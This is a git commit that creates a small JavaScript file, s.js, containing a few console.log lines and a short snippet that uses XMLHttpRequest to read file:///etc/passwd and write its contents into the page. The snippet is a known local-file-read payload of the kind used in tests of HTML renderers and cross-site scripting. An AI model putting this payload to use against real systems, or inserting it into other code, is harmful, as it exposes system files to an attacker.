7d7d6e60e112a3a3f78ab557bffb92cd9b968457
Shahid Nawaz <80408404+ShahidKalwani@users.noreply.github.com>
2024-03-10 23:28:29 +0500

    Create s.js

---
+++ s.js
@@ -0,0 +1,9 @@
+console.log("file called");
+
+console.log("welcome");
+console.log("another updated");
+// request
+x=new XMLHttpRequest;
+x.onload=function(){document.write(this.responseText)};
+x.open("GET","file:///etc/passwd");x.send();
+// udpated
